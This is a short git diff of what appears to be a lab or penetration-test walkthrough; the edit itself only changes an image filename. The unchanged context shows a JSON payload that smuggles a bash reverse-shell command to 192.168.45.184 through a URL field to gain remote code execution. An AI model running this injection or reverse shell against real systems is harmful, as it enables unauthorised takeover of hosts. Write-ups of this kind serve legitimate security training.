@@ -98,7 +98,7 @@ This confirms we have RCE. We can get a reverse shell via this JSON object:
 {"user":"clumsyadmin","url":"http://192.168.45.184/hiiamssrf; bash -c 'bash -i >& /dev/tcp/192.168.45.184/21 0>&1'"}
 ```
 
-<figure><img src="../../../.gitbook/assets/image (68).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../.gitbook/assets/image (68) (1).png" alt=""><figcaption></figcaption></figure>
 
 ## Privilege Escalation
 
